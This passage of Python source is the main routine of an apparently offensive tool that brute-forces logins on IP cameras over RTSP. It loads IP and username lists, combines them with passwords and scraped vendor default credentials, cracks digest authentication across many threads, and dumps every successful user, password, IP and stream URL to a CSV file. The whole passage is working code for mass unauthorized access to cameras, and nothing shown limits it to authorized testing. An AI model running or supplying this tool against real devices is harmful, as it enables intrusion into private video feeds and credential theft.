                _active_bar = tqdm(total=len(digest_devices), desc="Cracking digests", unit="dev")
            with ThreadPoolExecutor(max_workers=threads_number) as executor:
                for result in executor.map(lambda device: crack_digest_device(device, arguments.password), digest_devices):
                    if result:
                        successful_logins.append(result)
                    if _active_bar is not None:
                        _active_bar.update(1)
            if _active_bar is not None:
                _active_bar.close()
                _active_bar = None
    else:
        ips = []
        for ip_detail in arguments.ip.split(','):
            try:
                with open(ip_detail, 'r') as file:
                    display(':', f"Loading IPs from File {Back.MAGENTA}{ip_detail}{Back.RESET}")
                    current_ips = [ip for ip in file.read().split('\n') if ip.strip()]
                    ips.extend(current_ips)
                    display('+', f"IPs Loaded = {Back.MAGENTA}{len(current_ips)}{Back.RESET}")
            except FileNotFoundError:
                ips.append(ip_detail)
            except:
                display('-', f"Error Loading IPs from File {Back.YELLOW}{arguments.ip}{Back.RESET}")
                exit(0)
        ips = [ip for ip in ips if ip.strip()]
        if not arguments.user:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
            arguments.user = ['']
        else:
            try:
                with open(arguments.user, 'r') as file:
                    display(':', f"Loading Users from File {Back.MAGENTA}{arguments.user}{Back.RESET}")
                    arguments.user = [user for user in file.read().split('\n')]
                    display('+', f"Users Loaded = {Back.MAGENTA}{len(arguments.user)}{Back.RESET}")
            except FileNotFoundError:
                arguments.user = [user for user in arguments.user.split(',')]
            except OSError:
                arguments.user = [user for user in arguments.user.split(',')]
            except:
                display('-', f"Error Loading Users from File {Back.YELLOW}{arguments.user}{Back.RESET}")
                exit(0)

        # Thread count / boolean flags / timeouts.
        threads_number = int(arguments.threads) if arguments.threads else threads_number
        arguments.verbose = arguments.verbose != "False"
        fingerprint_enabled = arguments.fingerprint != "False"
        all_defaults_enabled = arguments.all_defaults == "True"
        reach_timeout = float(arguments.reach_timeout) if arguments.reach_timeout is not None else 2.0
        rtsp_timeout = float(arguments.rtsp_timeout) if arguments.rtsp_timeout is not None else 6.0
        max_routes = int(arguments.max_routes) if arguments.max_routes is not None else 25
        if arguments.capture == "True":
            frames_folder = Path.cwd() / "frames"
            frames_folder.mkdir(exist_ok=True)
            capture_frame = True
            if not _HAS_CV2:
                display('*', f"OpenCV not installed — frame capture ({Back.MAGENTA}-c{Back.RESET}) will be skipped")

        # Load the scraped camera DB (routes) + default-credentials list.
        creds_path = resolve_path(arguments.default_creds, DEFAULT_CREDS_PATHS)
        camera_db_path = resolve_path(arguments.camera_db, CAMERA_DB_PATHS)
        db = CameraDB.load(camera_db_path, creds_path)
        if camera_db_path:
            display('+', f"Loaded {Back.MAGENTA}{db.template_count}{Back.RESET} RTSP route template(s) from {Back.MAGENTA}{camera_db_path}{Back.RESET}")
        else:
            display('*', f"No camera DB found (looked for bundled data/cameras.csv). Using generic RTSP routes only.")
        if creds_path:
            display('+', f"Loaded {Back.MAGENTA}{db.vendor_count}{Back.RESET} vendor default credential(s) from {Back.MAGENTA}{creds_path}{Back.RESET}")
        elif fingerprint_enabled or all_defaults_enabled:
            display('*', f"No default-credentials list found (looked for bundled data/default_credentials.csv). Vendor defaults disabled.")

        # Cartesian user x password combos supplied on the command line.
        base_combos = []
        for user in arguments.user:
            for password in arguments.password:
                if (user, password) not in base_combos:
                    base_combos.append((user, password))

        options = {
            "verbose": arguments.verbose,
            "fingerprint": fingerprint_enabled,
            "use_defaults": db.vendor_count > 0,
            "all_defaults": all_defaults_enabled,
            "reach_timeout": reach_timeout,
            "rtsp_timeout": rtsp_timeout,
            "max_routes": max_routes,
            "fp_user": arguments.user[0] if arguments.user else "",
            "fp_pass": arguments.password[0] if arguments.password else "",
        }

        total_ips = len(ips)
        display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
        display(':', f"Base Credential Combinations  = {Back.MAGENTA}{len(base_combos)}{Back.RESET}")
        display(':', f"Fingerprinting = {Back.MAGENTA}{fingerprint_enabled}{Back.RESET}, Vendor Defaults = {Back.MAGENTA}{options['use_defaults']}{Back.RESET}, All Defaults Fallback = {Back.MAGENTA}{options['all_defaults']}{Back.RESET}, Max Routes = {Back.MAGENTA}{max_routes}{Back.RESET}")
        display(':', f"Starting {Back.MAGENTA}{threads_number}{Back.RESET} Threads", start='\n')

        t1 = time()
        successful_logins = []
        unreachable = 0
        if _HAS_TQDM:
            _active_bar = tqdm(total=total_ips, desc="Brute forcing", unit="host")
        with ThreadPoolExecutor(max_workers=threads_number) as executor:
            futures = {executor.submit(crack_host, ip, base_combos, db, options): ip for ip in ips}
            for future in as_completed(futures):
                result = future.result()
                if result["status"] == "OK":
                    successful_logins.append(result)
                elif result["status"] == "UNREACHABLE":
                    unreachable += 1
                if _active_bar is not None:
                    _active_bar.update(1)
        if _active_bar is not None:
            _active_bar.close()
            _active_bar = None
        t2 = time()

        display('+', f"All {Back.MAGENTA}{threads_number}{Back.RESET} Threads Completed Execution", start='\n')
        display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
        display(':', f"\tSuccessful Authorization = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
        display(':', f"\tUnreachable Hosts        = {Back.MAGENTA}{unreachable}{Back.RESET}")
        display(':', f"\tTime Taken               = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
        if t2 > t1:
            display(':', f"\tRate                     = {Back.MAGENTA}{total_ips/(t2-t1):.2f} IPs/second{Back.RESET}")
    display(':', f"Dumping Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}", start='\n')
    with open(arguments.write, 'w') as file:
        file.write("User,Password,IP,Vendor,Model,URL\n")
        file.write('\n'.join([f"{login.get('user', '')},{login.get('password', '')},{login.get('ip', '')},{login.get('vendor', '')},{login.get('model', '')},{login.get('url', '')}" for login in successful_logins]))
    display('+', f"Dumped Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}")
